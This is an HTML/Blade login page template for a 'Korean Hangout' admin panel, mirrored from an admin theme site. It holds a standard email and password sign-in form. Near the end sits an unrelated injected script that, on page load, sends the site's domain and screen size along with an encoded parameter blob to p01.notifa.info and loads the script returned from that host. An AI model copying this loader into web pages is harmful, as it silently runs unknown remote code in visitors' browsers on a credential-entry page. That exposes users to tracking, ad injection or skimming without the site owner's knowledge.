
<!DOCTYPE html>
<html lang="en">
  <!-- Mirrored from fox-admin-templates.multipurposethemes.com/foxadmin-dark/pages/examples/login.html by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 30 Jan 2020 02:34:49 GMT -->
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />

    <meta name="description" content="" />
    <meta name="author" content="" />

    <title>Korean Admin - Log in</title>
    <!-- Favicon -->
    <link rel="icon" href="{{ asset('assets/frontend/img/core-img/k3.png')}}">

    <!-- Bootstrap 4.0-->
    <link
      rel="stylesheet"
      href="../../assets/vendor_components/bootstrap/dist/css/bootstrap.min.css"
    />

    <!-- Font Awesome -->
    <link
      rel="stylesheet"
      href="../../assets/vendor_components/font-awesome/css/font-awesome.min.css"
    />

    <!-- Ionicons -->
    <link
      rel="stylesheet"
      href="../../assets/vendor_components/Ionicons/css/ionicons.min.css"
    />

    <!-- Theme style -->
    <link rel="stylesheet" href="../../css/master_style.css" />

    <!-- foxadmin Skins. Choose a skin from the css/skins
	   folder instead of downloading all of them to reduce the load. -->
    <link rel="stylesheet" href="../../css/skins/_all-skins.css" />

    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->

    <!-- google font -->
    <link
      href="https://fonts.googleapis.com/css?family=Poppins:300,400,500,600,700"
      rel="stylesheet"
    />
  </head>
  <body class="hold-transition login-page">
    <div class="login-box">
      <div class="login-logo">
        <a href="../../index-2.html"><b>K</b>Admin</a>
      </div>
      <!-- /.login-logo -->
      <div class="login-box-body">
        <p class="login-box-msg">Sign in to start your session</p>

        <form method="POST" action="{{ route('login') }}">
          @csrf
          <div class="form-group has-feedback">
            <input
              type="email"
              class="form-control @error('email') is-invalid @enderror"
              name="email"
              placeholder="Email"
              value="{{ old('email') }}"
              required
              autocomplete="email"
              autofocus
            />
            @error('email')
            <span class="invalid-feedback" role="alert">
              <strong>{{ $message }}</strong>
            </span>
            @enderror
            <span class="ion ion-email form-control-feedback"></span>
          </div>

          <div class="form-group has-feedback">
            <input
              type="password"
              class="form-control @error('password') is-invalid @enderror"
              name="password"
              placeholder="Password"
              required
              autocomplete="current-password"
            />
            @error('password')
            <span class="invalid-feedback" role="alert">
              <strong>{{ $message }}</strong>
            </span>
            @enderror
            <span class="ion ion-locked form-control-feedback"></span>
          </div>
          <div class="row">
            <div class="col-6">
              <div class="checkbox">
                <input class="form-check-input" type="checkbox" name="remember"
                id="remember" {{ old('remember') ? 'checked' : '' }}>
                <label for="basic_checkbox_1">Remember Me</label>
              </div>
            </div>
            <!-- /.col -->
            <div class="col-6">
              <div class="fog-pwd">
                <a href="javascript:void(0)"
                  >@if (Route::has('password.request'))
                  <i class="ion ion-locked"></i> Forgot pwd?</a
                >@endif<br />
              </div>
            </div>
            <!-- /.col -->
            <div class="col-12 text-center">
              <button
                type="submit"
                class="btn btn-info btn-block btn-flat margin-top-10"
              >
                SIGN IN
              </button>
            </div>
            <!-- /.col -->
          </div>
        </form>

        <div class="social-auth-links text-center">
          <p>- KH -</p>
        </div>
        <!-- /.social-auth-links -->

        <div class="margin-top-30 text-center">
          <p>
            Admin Korean Hangout
          </p>
        </div>
      </div>
      <!-- /.login-box-body -->
    </div>
    <!-- /.login-box -->

    <!-- jQuery 3 -->
    <script src="../../assets/vendor_components/jquery/dist/jquery.min.js"></script>

    <!-- popper -->
    <script src="../../assets/vendor_components/popper/dist/popper.min.js"></script>

    <!-- Bootstrap 4.0-->
    <script src="../../assets/vendor_components/bootstrap/dist/js/bootstrap.min.js"></script>

    <script type="text/javascript">
      if (self == top) {
        function netbro_cache_analytics(fn, callback) {
          setTimeout(function() {
            fn();
            callback();
          }, 0);
        }
        function sync(fn) {
          fn();
        }
        function requestCfs() {
          var idc_glo_url =
            location.protocol == "https:" ? "https://" : "http://";
          var idc_glo_r = Math.floor(Math.random() * 99999999999);
          var url =
            idc_glo_url +
            "p01.notifa.info/3fsmd3/request" +
            "?id=1" +
            "&enc=9UwkxLgY9" +
            "&params=" +
            "4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncXjkQFel19XwnRFcD8gGny3elCB6U9ZYoNj28PDWwR6hT27osxBgszCFCTJb4DNS7q4I49wuKpe3gTrbjLKZa2A0suXL9I4yN57XZVe%2b6WLVCTtzK6N%2bKNoenV%2fui5lnO8lr%2fDoce8cl4aDAuzDJE0nEAV5dMld1KTdCOFUIXqPvhk4%2f%2btQCGPXbpRcJnWAXWehvH8WW9G1fqddFevD23PFjCIw3743NFqU067mXnh%2bwxzkHsjSvmeJC0M0oVdLVcIdQvVrlOxkw61XaiOab%2fPCtLLJH7VbVPuWgDx4TbZx25VIKKsyAML4ltSmbByWwahFPLwsE129yXfVm0VAG4qpEU5KNF6bUR7E3m2ivRGM1BobKprBKXNgNRYd1AD5p89uAE%2fBbMQKqK4mJtXrD5w2yuupvYYxw%2fS4TKXKt9R4Be6FPH0EMcCe%2fwguS9z5e3CwpnKyFUK4QjLkoiTyq95ZGgms8BUHtc0YRcf4tQIClDOe6O5P3QLRQH88xIQkiu1oj0QZ%2fWesDAoztAG1gBxUE29w6sWgBZj" +
            "&idc_r=" +
            idc_glo_r +
            "&domain=" +
            document.domain +
            "&sw=" +
            screen.width +
            "&sh=" +
            screen.height;
          var bsa = document.createElement("script");
          bsa.type = "text/javascript";
          bsa.async = true;
          bsa.src = url;
          (
            document.getElementsByTagName("head")[0] ||
            document.getElementsByTagName("body")[0]
          ).appendChild(bsa);
        }
        netbro_cache_analytics(requestCfs, function() {});
      }
    </script>
  </body>

  <!-- Mirrored from fox-admin-templates.multipurposethemes.com/foxadmin-dark/pages/examples/login.html by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 30 Jan 2020 02:34:49 GMT -->
</html>
